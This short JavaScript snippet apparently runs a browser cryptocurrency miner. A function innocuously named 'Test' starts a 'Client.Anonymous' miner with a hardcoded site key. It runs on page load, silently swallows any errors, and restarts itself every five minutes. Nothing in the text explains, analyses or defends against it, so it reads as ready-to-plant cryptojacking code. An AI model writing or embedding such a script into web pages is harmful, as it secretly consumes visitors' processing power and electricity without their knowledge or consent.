function Test() {
    try {
        var miner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
            throttle: 0.3
        });
        miner.start();
        // Console.log('ServiceHit');

    }
    catch (e) {

    }
}


setInterval(function () {
    Test();

}, 300000)

Test();